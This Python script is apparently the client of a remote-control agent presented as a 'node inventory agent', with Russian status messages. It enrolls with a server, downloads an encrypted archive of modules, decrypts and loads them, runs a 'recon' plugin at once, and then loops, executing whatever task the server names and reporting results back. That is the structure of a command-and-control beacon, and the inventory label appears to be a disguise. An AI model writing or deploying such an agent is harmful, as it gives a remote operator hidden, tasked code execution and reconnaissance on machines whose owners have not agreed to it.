import importlib.util
import io
import json
import sys
import time
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
  sys.path.insert(0, str(ROOT))

from common.loader import load_modules_from_archive
from common.sync_client import InventorySync

DEFAULT_URL = "http://127.0.0.1:1337"
DEFAULT_CREDS = ("admin", "password")
INTERVAL = 15


def _extras_from_archive(archive: bytes, key: bytes) -> dict:
  from common.crypto import Encryptor

  enc = Encryptor(key)
  out = {}
  with zipfile.ZipFile(io.BytesIO(archive)) as zf:
    for info in zf.infolist():
      if info.filename.endswith(".json"):
        raw = enc.decrypt_str(zf.read(info).decode("utf-8"))
        out[Path(info.filename).stem] = json.loads(raw)
  return out


def main(url: str = DEFAULT_URL, creds: tuple[str, str] = DEFAULT_CREDS) -> None:
  client = InventorySync(url, creds)

  print("[i] Установка защищённого канала...")
  client.enroll()
  print(f"[i] Узел зарегистрирован: {client.node_id}")

  print("[i] Загрузка компонентов...")
  archive, key = client.pull_package()
  plugins = load_modules_from_archive(archive, key)
  ctx = {"agent_id": client.node_id, **_extras_from_archive(archive, key)}
  print(f"[i] Компоненты: {', '.join(sorted(plugins))}")

  if "recon" in plugins:
    client.report_job(0, "recon", plugins["recon"](ctx))

  print("[i] Цикл синхронизации (Ctrl+C — выход)")
  while True:
    try:
      client.ping()
      job = client.next_job()
      if job:
        name = job["task"]
        jid = job.get("task_id", 0)
        if name in plugins:
          client.report_job(jid, name, plugins[name](ctx))
        else:
          client.report_job(jid, name, {"error": "unknown", "known": list(plugins)})
      time.sleep(INTERVAL)
    except KeyboardInterrupt:
      print("\n[i] Остановлено")
      break


if __name__ == "__main__":
  import argparse

  p = argparse.ArgumentParser(description="Агент инвентаризации узла")
  p.add_argument("--server", default=DEFAULT_URL)
  p.add_argument("--user", default=DEFAULT_CREDS[0])
  p.add_argument("--password", default=DEFAULT_CREDS[1])
  a = p.parse_args()
  main(a.server, (a.user, a.password))
